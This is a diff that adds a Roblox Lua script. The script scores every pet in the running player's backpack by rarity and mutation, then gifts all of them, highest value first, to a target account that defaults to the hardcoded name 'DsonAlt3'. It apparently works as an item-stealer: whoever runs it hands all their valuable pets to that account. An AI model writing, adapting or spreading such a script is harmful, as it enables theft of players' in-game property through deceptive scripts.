@@ -1,0 +1,254 @@
+print("Script started!")
+
+-- Configuration
+-- Attempt to read TARGET_PLAYER_NAME from a global 'username' variable.
+-- If 'username' is not set, it will default to "DsonAlt3".
+local TARGET_PLAYER_NAME = _G.username or "DsonAlt3" -- Using _G to explicitly access global
+local GIFTING_INTERVAL = 1            -- Seconds to wait after equipping and after gifting each pet
+
+-- Pet Point System
+-- These keys should match the BASE NAME of your pet (e.g., "raccoon", "t-rex").
+-- The script will extract this from names like "T-Rex [4.92 KG]"
+-- All keys are lowercase for case-insensitive matching.
+local PET_POINTS = {
+    -- Normal Pets (all lowercase)
+    ["kitsune"] = 9,
+    ["disco bee"] = 8,
+    ["raccoon"] = 7,
+    ["butterfly"] = 6,
+    ["fennec fox"] = 5,
+    ["dragonfly"] = 4,
+    ["queen bee"] = 3,
+    ["t-rex"] = 2,
+    ["mimic octopus"] = 1,
+}
+
+local MUTATION_POINTS = {
+    -- Mutations (all lowercase, matching prefixes in pet names)
+    -- E.g., if a pet is "Shiny Raccoon", "shiny" should be a key here.
+    ["tranquil"] = 12,
+    ["ascended"] = 13,
+    ["inverted"] = 2,
+    ["rainbow"] = 11,
+    ["radiant"] = 10,
+    ["ironskin"] = 7,
+    ["golden"] = 5,
+    ["tiny"] = 6,
+    ["frozen"] = 3,
+    ["windy"] = 4,
+    ["mega"] = 8,
+    ["shiny"] = 1,
+    ["shocked"] = 9,
+}
+
+-- Access necessary services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+-- Get the local player
+local LocalPlayer = Players.LocalPlayer
+
+-- Wait for necessary RemoteEvents early to ensure they are available
+-- This assumes 'PetGiftingService' is inside 'ReplicatedStorage.GameEvents'
+local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+
+-- Function to safely wait (uses task.wait() in-game, or prints a message for simulation)
+local function safeWait(seconds)
+    if RunService:IsRunning() then
+        task.wait(seconds)
+    else
+        print(string.format("Waiting for %.1f seconds (simulated)...", seconds))
+    end
+end
+
+-- Function to safely extract base pet name and mutation from full pet name
+local function parsePetName(fullPetName)
+    local baseName = fullPetName
+    local mutationName = nil
+    local originalMutationPrefix = nil -- To store the original case of mutation from name
+
+    local lowerFullName = string.lower(fullPetName)
+
+    local bestMatch = nil
+    local bestMatchLength = 0
+
+    for mutKey, _ in pairs(MUTATION_POINTS) do
+        -- Check if the name starts with the mutation key followed by a space
+        local startPos, endPos = string.find(lowerFullName, "^" .. mutKey .. "%s")
+        if startPos == 1 then
+            if #mutKey > bestMatchLength then
+                bestMatch = mutKey
+                bestMatchLength = #mutKey
+            end
+        end
+    end
+
+    if bestMatch then
+        mutationName = bestMatch -- The lowercase mutation key
+        -- Extract original mutation prefix from the fullPetName to display later
+        originalMutationPrefix = string.sub(fullPetName, 1, bestMatchLength + 1)
+        -- Remove the mutation prefix (and the following space) to get the potential base name
+        baseName = string.sub(fullPetName, bestMatchLength + 2)
+    end
+
+    -- Now, extract the base pet name by removing anything in brackets [like this] and trimming spaces
+    local finalBaseName = string.match(baseName, "([^%[]+)") or baseName
+    finalBaseName = string.lower(string.gsub(finalBaseName, "%s+$", "")) -- Convert to lowercase and trim trailing spaces
+
+    return finalBaseName, mutationName, originalMutationPrefix
+end
+
+-- Function to calculate pet score and identify mutation
+local function calculatePetScoreAndMutation(item)
+    local fullPetName = item.Name
+    local basePetName, mutationKey, originalMutationPrefix = parsePetName(fullPetName)
+
+    local score = PET_POINTS[basePetName] or 0 -- Lookup base score
+    local foundMutationName = nil
+
+    if mutationKey and MUTATION_POINTS[mutationKey] then
+        score = score + MUTATION_POINTS[mutationKey]
+        foundMutationName = originalMutationPrefix -- Use original case for display
+    end
+
+    return score, foundMutationName, basePetName -- Return basePetName for logging
+end
+
+-- Main script logic execution flow
+print("Checking for LocalPlayer...")
+if not LocalPlayer then
+    print("ERROR: LocalPlayer not found. Script cannot proceed. Make sure this is a LocalScript.")
+    return
+end
+print("LocalPlayer found: " .. LocalPlayer.Name)
+
+print("Checking for LocalPlayer's Backpack...")
+local Backpack = LocalPlayer:FindFirstChild("Backpack")
+if not Backpack then
+    print("ERROR: LocalPlayer's Backpack not found. Script cannot proceed. Character/Backpack might not be fully loaded yet.")
+    return
+end
+print("Backpack found for " .. LocalPlayer.Name)
+
+-- Check if TARGET_PLAYER_NAME was set via global 'username'
+if _G.username then
+    print("Target player name set from global 'username': " .. TARGET_PLAYER_NAME)
+else
+    warn("Global 'username' variable not found. Using default TARGET_PLAYER_NAME: " .. TARGET_PLAYER_NAME)
+end
+
+-- Find the target player for gifting
+local targetPlayer = Players:FindFirstChild(TARGET_PLAYER_NAME)
+if not targetPlayer then
+    warn("Target player '" .. TARGET_PLAYER_NAME .. "' not found in game. Gifting process cannot proceed.")
+    return -- Exit if target player is not found
+end
+print("Target player found: " .. TARGET_PLAYER_NAME)
+
+local petsToGift = {}
+
+print("--- Starting Pet Scan and Prioritization for Gifting ---")
+print("Scanning items in " .. LocalPlayer.Name .. "'s Backpack for pets...")
+
+local foundAnyValidPetForScan = false
+for _, item in ipairs(Backpack:GetChildren()) do
+    local petUUID = item:GetAttribute("PET_UUID") -- Still check for PET_UUID to identify valid pets
+
+    if petUUID and type(petUUID) == "string" and petUUID ~= "" then
+        local score, mutation, basePetName = calculatePetScoreAndMutation(item)
+        table.insert(petsToGift, {Item = item, UUID = petUUID, PetType = basePetName, Mutation = mutation, Score = score})
+        print("Found pet '" .. item.Name .. "' (Base Type: " .. basePetName .. (mutation and ", Mutation: " .. mutation or "") .. ") with PET_UUID: " .. petUUID .. ", Score: " .. score .. " in Backpack.")
+        foundAnyValidPetForScan = true
+    else
+        print("WARNING: Item '" .. item.Name .. "' does not have a valid 'PET_UUID' attribute. Skipping from gifting consideration.")
+    end
+end
+
+-- Sort pets by score in descending order
+table.sort(petsToGift, function(a, b)
+    return a.Score > b.Score
+end)
+
+-- Execute the gifting process
+if #petsToGift > 0 then
+    print("\n--- Prioritized Pet List for Gifting ---")
+    print("Found " .. #petsToGift .. " pets to gift. Starting gifting to " .. TARGET_PLAYER_NAME .. " in order of score:")
+    for i, petData in ipairs(petsToGift) do
+        local petItem = petData.Item
+        local petUUID = petData.UUID
+        local petType = petData.PetType
+        local petMutation = petData.Mutation
+        local petScore = petData.Score
+
+        print(string.format("--- Gifting pet %d/%d: '%s' (Base Type: %s%s, PET_UUID: %s, Score: %d) ---", i, #petsToGift, petItem.Name, petType, (petMutation and " (" .. string.gsub(petMutation, "%s+$", "") .. ")" or ""), petUUID, petScore))
+
+        -- Step 1: Attempt to equip the pet if it's a Tool
+        if petItem:IsA("Tool") then
+            local Character = LocalPlayer.Character
+            local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+
+            if Humanoid then
+                -- Unequip any currently held tool first to ensure the new one can be equipped
+                Humanoid:UnequipTools()
+                safeWait(0.1) -- Small wait to allow unequip to register
+
+                local successEquip, equipError = pcall(function()
+                    Humanoid:EquipTool(petItem) -- Use EquipTool method
+                end)
+                if successEquip then
+                    print("Attempted to equip pet tool using Humanoid:EquipTool(): " .. petItem.Name)
+                    -- Wait until the tool is actually equipped (parent changes to character/hand)
+                    local equipSuccess = false
+                    local timeout = 5 -- seconds to wait for equip
+                    local startTime = tick()
+                    while tick() - startTime < timeout and not equipSuccess do
+                        if petItem.Parent == Character or (petItem.Parent and petItem.Parent.Parent == Character) then
+                            equipSuccess = true
+                            break
+                        end
+                        safeWait(0.1) -- Small wait to avoid busy-waiting
+                    end
+
+                    if equipSuccess then
+                        print("Pet tool '" .. petItem.Name .. "' successfully equipped.")
+                    else
+                        warn("Pet tool '" .. petItem.Name .. "' did not equip within timeout. Proceeding anyway.")
+                    end
+                    safeWait(GIFTING_INTERVAL) -- Wait after equip attempt
+                else
+                    warn("Failed to call Humanoid:EquipTool() for '" .. petItem.Name .. "': " .. tostring(equipError))
+                    safeWait(GIFTING_INTERVAL) -- Still wait to maintain interval
+                end
+            else
+                warn("Character Humanoid not found for '" .. petItem.Name .. "'. Cannot equip tool. Proceeding with gift attempt.")
+                safeWait(GIFTING_INTERVAL) -- Still wait to maintain interval
+            end
+        else
+            warn("Item '" .. petItem.Name .. "' is not a Tool. Cannot equip. Proceeding with gift attempt.")
+            safeWait(GIFTING_INTERVAL) -- Still wait to maintain interval
+        end
+
+        -- Step 2: Fire the gifting service
+        local successGift, giftError = pcall(function()
+            PetGiftingService:FireServer("GivePet", targetPlayer, petUUID) -- Pass the petUUID to identify the pet on the server
+        end)
+        if successGift then
+            print("Successfully attempted to gift pet '" .. petItem.Name .. "' (UUID: " .. petUUID .. ") to " .. TARGET_PLAYER_NAME)
+        else
+            warn("Failed to fire PetGiftingService for '" .. petItem.Name .. "': " .. tostring(giftError))
+        end
+
+        -- Wait before processing the next pet, unless it's the last one
+        if i < #petsToGift then
+            safeWait(GIFTING_INTERVAL)
+        end
+    end
+    print("All found pets in Backpack have been processed for gifting.")
+else
+    print("No pets with valid PET_UUIDs found in Backpack to gift or score.")
+    if not foundAnyValidPetForScan then
+        print("Reason: No items in Backpack had a valid 'PET_UUID' attribute, or their Name could not be matched to a base pet type/mutation.")
+    end
+end
+print("--- Gifting Process Complete ---")
